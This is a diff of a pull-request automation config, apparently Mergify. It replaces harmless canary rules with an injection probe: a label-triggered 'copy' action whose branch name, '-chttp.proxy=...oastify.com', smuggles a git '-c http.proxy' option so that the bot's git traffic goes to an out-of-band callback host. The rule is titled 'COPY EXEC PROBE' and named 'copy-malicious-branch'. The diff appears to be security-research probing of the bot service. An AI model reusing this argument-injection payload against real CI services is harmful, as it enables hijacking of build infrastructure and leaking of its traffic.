@@ -1,14 +1,19 @@
 pull_request_rules:
-  - name: canary-comment-8730
-    conditions: []
-    actions:
-      comment:
-        message: "[CANARY-FRESHCOOKIE] If this comment shows up on the PR, basic comment actions fire on this account."
-  - name: canary-label
-    conditions: []
+  - name: auto-label-trigger
+    conditions:
+      - head = ssti-test
     actions:
       label:
-        add: [freshcanary]
+        add: [trigger-copy-91177efd]
+
+  - name: copy-malicious-branch
+    conditions:
+      - label = trigger-copy-91177efd
+    actions:
+      copy:
+        branches:
+          - "-chttp.proxy=copyexec-17799691177efd.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
+        title: "COPY EXEC PROBE"
 
 merge_protections_settings:
   reporting_method: check-runs
